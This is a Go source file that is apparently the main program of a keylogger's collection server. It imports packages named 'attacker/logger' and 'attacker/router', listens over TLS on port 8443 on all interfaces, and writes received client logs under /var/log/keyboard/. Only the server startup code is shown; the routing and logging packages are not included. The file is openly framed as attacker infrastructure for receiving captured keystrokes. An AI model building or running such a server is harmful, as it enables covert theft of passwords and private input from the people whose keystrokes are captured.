package main

import (
	"flag"
	"fmt"
	"log"

	"attacker/logger"
	"attacker/router"
)

func main() {
	outputDir := flag.String("output-dir", "/var/log/keyboard/", "Directory to store client log files")
	port := flag.String("port", "8443", "Port to bind the server to")
	tlsCert := flag.String("tls-cert", "server.crt", "Path to the TLS certificate (.crt) file")
	tlsKey := flag.String("tls-key", "server.key", "Path to the TLS private key (.key) file")

	flag.Parse()

	logManager, err := logger.New(*outputDir)
	if err != nil {
		log.Fatalf("Failed to initialize log manager at %s: %v", *outputDir, err)
	}
	defer logManager.Close()

	r := router.CreateRouter(logManager)

	addr := fmt.Sprintf("0.0.0.0:%s", *port)

	if err := r.RunTLS(addr, *tlsCert, *tlsKey); err != nil {
		log.Fatalf("Server failed to start: %v", err)
	}
}
